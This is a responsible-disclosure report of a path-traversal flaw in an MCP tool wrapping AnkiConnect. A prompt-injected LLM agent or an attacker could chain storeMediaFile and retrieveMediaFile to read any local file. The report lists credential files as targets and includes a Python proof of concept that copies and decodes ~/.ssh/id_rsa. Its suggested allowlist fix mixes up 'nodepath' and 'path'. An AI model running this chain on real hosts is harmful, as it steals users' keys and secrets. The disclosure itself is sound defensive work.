# Security Report: mediaActions Path Traversal

**Reported by:** Hideaki Takahashi, Ph.D. student, Columbia University
**Date received:** 2026-04-08
**Affected component:** `mediaActions` tool — `storeMediaFile` action

---

## Original Report

Dear Mr. Anatoly Tarnavsky,

I hope this email finds you well. I am Hideaki Takahasih, a Ph.D. student working on software security at Columbia University, and I am responsibly disclosing a high-severity security vulnerability in the `mediaActions` MCP tool.

Currently, the `storeMediaFile` action accepts a `path` parameter (`mediaActions.tool.ts:65`) which is passed directly to the underlying AnkiConnect API without any sanitization or validation. Because AnkiConnect runs with the permissions of the local user, supplying an absolute path to this endpoint allows the tool to read any file on the host machine and copy it into Anki's `collection.media` folder.

```
// storeMediaFile.action.ts:41-78
export async function storeMediaFile(params, client) {
  const { filename, data, path, url, deleteExisting = true } = params;
  // ...
  const ankiParams: Record<string, any> = { filename, deleteExisting };
  if (data) ankiParams.data = data;
  else if (path) ankiParams.path = path;  // no validation
  else if (url)  ankiParams.url = url;
  const result = await client.invoke<string>("storeMediaFile", ankiParams);
```

This creates a severe exploit chain when combined with the `retrieveMediaFile` action. An attacker, or a hijacked LLM agent via Prompt Injection, can store a sensitive local file into the Anki media collection, and then immediately retrieve its contents as a base64-encoded string.

This flaw allows an untrusted MCP client or a manipulated LLM to exfiltrate any file readable by the OS user running Anki. This includes, but is not limited to:

- SSH private keys (`~/.ssh/id_rsa`, `~/.ssh/id_ed25519`)
- Environment variables and application secrets (`.env`, `~/.aws/credentials`)
- Shell configurations and history (`~/.bashrc`, `~/.zsh_history`)

As Proof of Concept, an attacker can execute the following sequence via the MCP client:

```python
# 1. Instruct the tool to read a sensitive local file and store it in Anki's media collection
client.call_tool("mediaActions", {
    "action": "storeMediaFile",
    "path": "/home/user/.ssh/id_rsa", # Or %USERPROFILE%\.ssh\id_rsa on Windows
    "filename": "exfiltrated_key",
})

# 2. Retrieve the copied file's content as a base64 string
result = client.call_tool("mediaActions", {
    "action": "retrieveMediaFile",
    "filename": "exfiltrated_key",
})

# 3. Decode the result to view the private key
import base64
content = base64.b64decode(result["content"][0]["data"])
print(content.decode())
```

The following codes are affected by this issue:

- **`mediaActions.tool.ts`:** Exposes the `path` parameter as an unconstrained string in the schema.
- **`storeMediaFile.action.ts`:** Forwards the `path` argument directly to `client.invoke<string>("storeMediaFile", ankiParams)` without path validation.

Because MCP tools expose functionality to LLMs that frequently ingest untrusted text (making them vulnerable to prompt injection), unrestricted filesystem access should be avoided. I recommend one of the following two fixes:

**Option A (Recommended): Remove the `path` parameter entirely**
Remove `path` from the MCP tool schema. Force users and the LLM to upload media via the `data` (base64) or `url` parameters instead. The `path` option is a convenience meant for local scripts running within the same trust boundary as Anki, not for MCP exposure.

**Option B: Implement a strict Server-Side Allowlist**
If local file path reading is strictly necessary, gate it behind a configured allowlist directory.
```typescript
import * as nodepath from "path";
const ALLOWED_IMPORT_ROOT = path.resolve(process.env.MEDIA_IMPORT_DIR || "");
const resolved = path.resolve(params.path);

if (!resolved.startsWith(ALLOWED_IMPORT_ROOT + path.sep)) {
  throw new Error("Path must be within the configured media import directory.");
}
```

Let me know if there is anything I can help.

Sincerely,
Hideaki
